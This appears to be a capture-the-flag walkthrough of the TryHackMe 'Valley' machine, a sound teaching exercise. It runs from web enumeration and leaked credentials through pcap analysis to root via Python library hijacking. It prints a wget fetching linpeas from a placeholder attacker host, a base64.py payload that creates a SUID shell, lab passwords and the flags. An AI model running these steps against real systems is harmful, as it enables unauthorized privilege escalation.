# Valley - TryHackMe Writeup

## Overview

Today we are going to look at another **TryHackMe** challenge named **Valley**. This machine is a **Linux and web-based target** that requires a combination of **web enumeration**, **source-code review**, **credential discovery**, **PCAP analysis**, and **privilege escalation through Python library hijacking**.

The box starts with a fairly normal web application and a hidden development area, but the path to compromise does not come from a single vulnerability. Instead, the machine chains together multiple small weaknesses:

* exposed development content
* hardcoded credentials in client-side JavaScript
* FTP access with reused credentials
* packet captures containing reused login credentials
* weak password reuse across services and local users
* a root cron job using Python
* a writable Python library file that can be hijacked for privilege escalation

This writeup walks through the entire compromise path from **initial enumeration** to **root access**, while explaining not only *what* was done, but also *why* each finding mattered.

---

# Table of Contents

* [Machine Information](#machine-information)
* [Initial Reconnaissance](#initial-reconnaissance)
* [Web Enumeration](#web-enumeration)
* [Discovery of the Hidden Development Area](#discovery-of-the-hidden-development-area)
* [Client-Side Credential Disclosure](#client-side-credential-disclosure)
* [FTP Access and Looting](#ftp-access-and-looting)
* [PCAP Analysis and Credential Recovery](#pcap-analysis-and-credential-recovery)
* [SSH Access and User Flag](#ssh-access-and-user-flag)
* [Privilege Escalation Enumeration](#privilege-escalation-enumeration)
* [Discovery of `valleyAuthenticator`](#discovery-of-valleyauthenticator)
* [Lateral Movement to `valley`](#lateral-movement-to-valley)
* [Python Library Hijacking via Root Cron Job](#python-library-hijacking-via-root-cron-job)
* [Root Access](#root-access)
* [Flags](#flags)
* [Attack Chain Summary](#attack-chain-summary)
* [Key Takeaways](#key-takeaways)

---

# Machine Information

| Field          | Value                                                         |
| -------------- | ------------------------------------------------------------- |
| Room / Machine | Valley                                                        |
| Platform       | TryHackMe                                                     |
| Target IP      | `10.48.167.116`                                               |
| OS             | Linux                                                         |
| Attack Type    | Web + Credential Reuse + PCAP Analysis + Privilege Escalation |

---

# Initial Reconnaissance

As always, the first step is to enumerate the target and understand its exposed attack surface.

## Full Port Scan

A full TCP port scan was run against the target:

```bash
nmap -p- -T4 10.48.167.116
```

### Result

```text
Nmap scan report for ip-10-48-167-116.ap-south-1.compute.internal (10.48.167.116)
Host is up, received echo-reply ttl 64 (0.00010s latency).
Not shown: 65532 closed tcp ports (reset)

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown
```

This immediately gave three interesting services:

* **22/tcp** → SSH
* **80/tcp** → HTTP
* **37370/tcp** → unknown at first, but clearly suspicious because of the non-standard port

The presence of an unusual high port often suggests either:

* an alternate service
* a development/debug service
* a service intentionally moved away from its default port

That made `37370` a high-priority target for further fingerprinting.

---

# Service and Version Detection

To identify the services properly, a version scan was performed:

```bash
nmap -sC -sV -p 22,80,37370 10.48.167.116
```

### Result

```text
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     vsftpd 3.0.3
```

## Initial conclusions

At this point the attack surface became much clearer:

### 1. **Port 22 - SSH**

A normal SSH service was running. No direct foothold yet, but worth revisiting later once credentials were found.

### 2. **Port 80 - HTTP**

The web service would likely be the initial access vector.

### 3. **Port 37370 - FTP**

This was the first real anomaly. FTP was running on a **non-standard port**, which strongly suggested it was intentionally moved or hidden from casual inspection.

The fact that FTP was running on a strange port became more meaningful later, especially once development notes and credential reuse came into play.

---

# Web Enumeration

Since the web server on port 80 was the most obvious entry point, enumeration started there.

Opening the website showed a page related to **Valley**, and from the structure it was clear that more content was likely hidden behind unlinked directories and static resources.

## Directory Enumeration with Feroxbuster

A directory scan was performed:

```bash
feroxbuster -u http://10.48.167.116/
```

### Result

```text
/pricing/  => Directory listing
/gallery/  => Directory listing
/static/   => Directory
```

These findings were important because they immediately showed that the web server had:

* accessible content directories
* at least one directory listing
* a `/static/` path that looked like it might contain unlinked resources

---

# Investigating `/pricing/`

Inside `/pricing/`, a file named `note.txt` was found.

### Contents of `note.txt`

```text
J,
Please stop leaving notes randomly on the website
-RP
```

At first glance this looked small, but it was actually an important clue. It suggested:

* multiple internal users or developers were interacting with the site
* development notes were being left in public-facing locations
* the website might contain other exposed dev artifacts or forgotten files

This note strongly hinted that **poor operational hygiene** was part of the machine design.

---

# Investigating `/gallery/` and `/static/`

The `/gallery/` content referenced image paths such as:

```text
/static/15
/static/<number>
```

This was the first real clue that `/static/` was not a normal asset directory. Instead of predictable names like `image.jpg` or `script.js`, it used **numbered resources**.

That led to manual testing of the `/static/` path.

---

# Discovery of `/static/00`

Browsing directly to:

```text
/static/00
```

returned a developer note:

```text
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

This was a major breakthrough.

## Why this mattered

This note exposed several valuable pieces of information:

### 1. **A username / developer name**

* `valleyDev`

### 2. **A hidden path**

* `/dev1243224123123`

### 3. **Operational context**

* references to SIEM
* development work
* photo editing content

The most important part was the hidden path:

```text
/dev1243224123123
```

That looked exactly like a **forgotten development endpoint** or **internal admin path** accidentally left exposed.

---

# Enumerating `/static/` More Aggressively

Because the gallery referenced numeric files and `/static/00` contained useful information, the next step was to brute-force other numeric resources under `/static/`.

A small numeric wordlist was created:

```bash
cat num.txt | head -n 10
00
01
02
03
04
05
06
07
08
09
```

Then expanded:

```bash
seq 10 99 >> num.txt
```

Then used with Gobuster:

```bash
gobuster dir -u http://10.48.167.116/static/ -w num.txt
```

### Result

```text
00  (Status: 200)
10  (Status: 200)
11  (Status: 200)
12  (Status: 200)
13  (Status: 200)
14  (Status: 200)
15  (Status: 200)
16  (Status: 200)
17  (Status: 200)
18  (Status: 200)
```

Most of these were images or static content, but the key win was still `00`, because it revealed the hidden development path.

---

# Discovery of the Hidden Development Area

Navigating to:

```text
http://10.48.167.116/dev1243224123123
```

revealed a **login page**.

At this stage the target looked like it had an internal development portal or dev-only login area. The first instinct was to try common attacks such as SQL injection, but those attempts did not succeed.

Since the page itself was accessible, the next step was to inspect the **page source** and linked client-side files.

---

# Client-Side Credential Disclosure

Reviewing the source revealed a linked JavaScript file:

```text
dev.js
```

Inspecting the file exposed hardcoded credentials directly in the client-side code:

```javascript
if (username === "siemDev" && password === "california") {
    window.location.href = "/dev1243224123123/devNotes37370.txt";
} else {
    loginErrorMsg.style.opacity = 1;
}
```

This was a classic case of **client-side authentication logic leaking secrets**.

## Credentials recovered

* **Username:** `siemDev`
* **Password:** `california`

## Why this is critical

This is not just a bad frontend design issue. It completely breaks the secrecy of the login process because anyone viewing the JavaScript can see the credentials.

Using those credentials allowed access to:

```text
/dev1243224123123/devNotes37370.txt
```

---

# Development Notes from the Hidden Area

The file `devNotes37370.txt` contained:

```text
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

This note confirmed several things at once:

## 1. FTP is important

The note explicitly references the FTP server.

## 2. Credentials are being reused

This is the biggest clue in the note. The line:

> **stop reusing credentials**

strongly implies that the credentials already discovered may work elsewhere.

## 3. FTP is intentionally on a weird port

The note mentions changing the FTP port back to a normal port, which explains why FTP was running on **37370**.

So at this point the likely next move was clear:

> Try the `siemDev:california` credentials against the FTP service on port `37370`.

---

# FTP Access and Looting

Using the credentials against FTP worked.

```bash
ftp 10.48.167.116 37370
```

Login with:

* **Username:** `siemDev`
* **Password:** `california`

### Listing the files

```text
-rw-rw-r--    1 1000 1000    7272    Mar 06 2023 siemFTP.pcapng
-rw-rw-r--    1 1000 1000 1978716    Mar 06 2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000 1000 1972448    Mar 06 2023 siemHTTP2.pcapng
```

This was another major pivot point.

Instead of source code or documents, the FTP server contained **packet captures**. That strongly suggested the next stage of the machine would involve **network traffic analysis** to recover more credentials or operational details.

All `.pcapng` files were downloaded locally for analysis.

---

# PCAP Analysis and Credential Recovery

The three packet captures were then inspected with **Wireshark / tshark**. Since the goal was credential discovery, the analysis focused on protocols such as:

* HTTP
* FTP
* SSH
* DNS

The most important finding came from one of the HTTP captures.

## Recovered HTTP Form Credentials

A packet contained an HTTP POST form submission with the following parameters:

```text
Form item: "uname" = "valleyDev"
Form item: "psw" = "ph0t0s1234"
Form item: "remember" = "on"
```

This was the foothold we needed.

## New credentials recovered

* **Username:** `valleyDev`
* **Password:** `ph0t0s1234`

These credentials looked like valid user credentials rather than application-only credentials, so the next logical step was to try them against **SSH**.

---

# SSH Access and User Flag

SSH login as `valleyDev` succeeded:

```bash
ssh valleyDev@10.48.167.116
```

Password:

```text
ph0t0s1234
```

Once logged in, the home directory contained `user.txt`.

## User flag

```text
THM{k@l1_1n_th3_v@lley}
```

At this point we had a stable shell on the machine as **valleyDev** and could move into privilege escalation.

---

# Privilege Escalation Enumeration

With a shell as `valleyDev`, the next step was to enumerate the system thoroughly.

`linpeas.sh` was transferred and executed:

```bash
wget http://<attacker-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## Interesting findings from enumeration

Several items stood out:

### 1. **pkexec present**

`linpeas` highlighted **PwnKit / CVE-2021-4034** as a possible path.

```text
/usr/bin/pkexec
```

### 2. **Potential kernel exploit suggestions**

These were noted but not immediately useful for a clean path.

### 3. **A root cron job**

This turned out to be the most important finding.

Inspecting `/etc/crontab` showed:

```cron
1 * * * * root python3 /photos/script/photosEncrypt.py
```

This means that every hour, **root** executes a Python script:

```text
/photos/script/photosEncrypt.py
```

This is a major privilege-escalation lead because when root runs a Python script, the script imports modules from the Python environment, and if any of those modules can be hijacked, code execution as root becomes possible.

---

# Why the Initial `pkexec` Route Was Not Used

The presence of `pkexec` and a probable PwnKit path was promising, but exploitation did not work cleanly in this environment because required tooling or compilation support was not available.

Rather than forcing an unstable exploit path, the better move was to continue enumerating for a machine-specific privilege escalation route.

That led to further inspection of the filesystem and users.

---

# Discovery of `valleyAuthenticator`

While exploring `/home`, an unusual binary stood out:

```text
/home/valleyAuthenticator
```

Listing `/home` showed:

```text
-rwxrwxr-x 1 valley valley 732K Aug 14 2022 valleyAuthenticator
```

This binary was clearly worth inspecting.

The file was copied or served out so it could be examined from the attacker machine. Running `strings` on it revealed a highly suspicious fragment:

```bash
strings valleyAuthenticator | grep -i e672
```

### Output

```text
e6722920bab2326f8217e4 -> liberty123
```

This looked like a stored or embedded credential mapping. The recovered password was:

```text
liberty123
```

At this point, there were multiple local users on the box, and the most likely next step was to test this credential against another user.

---

# Lateral Movement to `valley`

Using the password with `su valley` worked:

```bash
su valley
```

Password:

```text
liberty123
```

Now we had access as the **valley** user.

This change in user context was critical because the final privilege escalation path depended on file permissions that were not usable from `valleyDev`.

---

# Why Switching to `valley` Mattered

The root cron job was running:

```text
python3 /photos/script/photosEncrypt.py
```

The exploit path eventually used **Python library hijacking** by modifying:

```text
/usr/lib/python3.8/base64.py
```

The key point is that **this modification was possible as `valley`**, not as `valleyDev`.

So the lateral move from `valleyDev` → `valley` was not just another credential pivot; it was the access level needed to tamper with a Python module that root would later import.

---

# Python Library Hijacking via Root Cron Job

Now that we had the correct user context, the privilege escalation path became straightforward.

## Observed root cron job

```cron
1 * * * * root python3 /photos/script/photosEncrypt.py
```

## Python version

```bash
python3 --version
```

```text
Python 3.8.10
```

## Attack idea

If the root-run script imports Python modules such as `base64`, and we can modify the module file on disk, then when root executes the script, our malicious code will run **inside root’s Python process**.

That is exactly what was done.

---

# Malicious Code Injection into `base64.py`

A malicious line was appended to the Python standard library file:

```bash
echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' >> /usr/lib/python3.8/base64.py
```

## What this payload does

When root later imports `base64`, the injected code runs automatically and executes:

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

This creates a copy of `/bin/bash` at:

```text
/tmp/bash
```

and sets the **SUID bit** on it.

So after the cron job runs as root, `/tmp/bash` becomes a root-owned SUID shell.

---

# Waiting for Cron and Triggering Root Shell

After the cron job executed, the new SUID shell appeared.

Checking it showed:

```text
-rwsr-sr-x 1 root root 1.2M Jun 24 21:32 bash
```

Now it could be executed with preserved privileges:

```bash
/tmp/bash -p
```

This dropped a root shell.

## Verification

```bash
whoami
```

```text
root
```

---

# Root Access

With root access established, the root flag was retrieved:

```bash
cat /root/root.txt
```

## Root flag

```text
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc
```

---

# Flags

## User flag

```text
THM{k@l1_1n_th3_v@lley}
```

## Root flag

```text
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc
```

---

# Attack Chain Summary

The full compromise chain on **Valley** can be summarized like this:

## 1. Initial enumeration

* Found:

  * `22/tcp` SSH
  * `80/tcp` HTTP
  * `37370/tcp` FTP

## 2. Web enumeration

* Discovered:

  * `/pricing/`
  * `/gallery/`
  * `/static/`

## 3. Developer note in `/static/00`

* Revealed hidden path:

  * `/dev1243224123123`

## 4. Hidden dev login page

* Source code / `dev.js` contained hardcoded credentials:

  * `siemDev : california`

## 5. Reused credentials against FTP

* FTP on port `37370` accepted:

  * `siemDev : california`

## 6. FTP loot

* Downloaded packet captures:

  * `siemFTP.pcapng`
  * `siemHTTP1.pcapng`
  * `siemHTTP2.pcapng`

## 7. PCAP analysis

* Recovered HTTP credentials:

  * `valleyDev : ph0t0s1234`

## 8. SSH access

* Logged in as `valleyDev`
* Retrieved `user.txt`

## 9. Local enumeration

* Found root cron job:

  * `python3 /photos/script/photosEncrypt.py`

## 10. Binary inspection

* `valleyAuthenticator` revealed password:

  * `liberty123`

## 11. Lateral move

* `su valley` with `liberty123`

## 12. Privilege escalation

* Modified `/usr/lib/python3.8/base64.py`
* Waited for root cron job to import the module
* Cron created SUID bash shell
* Used `/tmp/bash -p` to become root

---

# Key Takeaways

This machine is a good example of how a compromise can be built from **multiple small weaknesses** rather than a single major bug.

## 1. Exposed development content is dangerous

The first foothold came from developer notes exposed in a web directory. Even a small forgotten note can reveal usernames, hidden paths, or internal operational details.

## 2. Client-side authentication logic is not security

The dev portal stored credentials directly in JavaScript. If the browser can see it, the attacker can see it too.

## 3. Credential reuse multiplies the impact of one leak

The `siemDev` credentials worked on FTP because the same password was reused across services.

## 4. Packet captures can be sensitive loot

Storing `.pcapng` files on an accessible FTP server was effectively equivalent to storing plaintext credentials. Once downloaded, those captures leaked the `valleyDev` login.

## 5. Enumeration after foothold is everything

The final privilege escalation did not come from the first exploit suggestion. It came from careful enumeration of cron jobs, local files, user relationships, and Python behavior.

## 6. Writable Python libraries + root Python scripts = privilege escalation

If a root cron job runs a Python script and an attacker can modify an imported module, that becomes an extremely powerful escalation vector.

---

# Conclusion

**Valley** is a strong example of a realistic multi-stage Linux compromise where no single step is especially complex, but the full chain requires good observation and persistence.

The machine combines:

* web enumeration
* source review
* credential reuse
* FTP abuse
* PCAP analysis
* lateral movement
* privilege escalation through Python module hijacking

The path to root was:

> **exposed web notes → hidden dev portal → hardcoded creds → FTP access → PCAP credential recovery → SSH foothold → password recovery from local binary → switch user → Python library hijack via root cron → root shell**

This makes Valley a very good room for practicing **full attack-path thinking** rather than looking for only one obvious exploit.

---
